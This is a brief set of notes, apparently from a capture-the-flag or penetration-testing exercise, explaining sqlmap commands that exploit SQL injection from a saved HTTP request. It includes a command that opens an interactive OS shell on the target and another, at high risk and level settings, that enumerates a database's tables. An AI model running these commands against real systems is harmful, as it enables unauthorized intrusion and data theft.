```
sqlmap -r save.req --batch --threads 10 --no-cast --os-shell

-r save.req : Uses a raw HTTP request from a file (save.req).

--batch : Runs automatically without prompting for user input.

--threads 10 : Uses 10 concurrent threads for faster scanning.

--no-cast : Prevents SQLMap from automatically converting data types 
during payload crafting.

--os-shell : If successful, drops you into an interactive OS shell on the target.
```


```
sqlmap -r save.req --batch --threads 10 --no-cast --dbms=mysql --union-cols=8 --level=5 --risk=3 -D usage_blog --tables

--risk=3 : extends the used vector set based on their risk of causing problems at the target side

--level=5 : extends both vectors and boundaries being used, based on their expectancy of success

--union-cols=8 : If we can manually find the exact number of columns of the vulnerable SQL query.

--union-char='a' : In case that the default "dummy" filling values used by SQLMap -`NULL` and random integer- are not compatible

--dbs : list all the databases

-D <database name> : enumerate a specific database

-T <table name> : enumerate a specific table

--tables : retrieve all the tables in a database

-C <column name> : must be used in conjuction with -T <table> and -D <database>

```
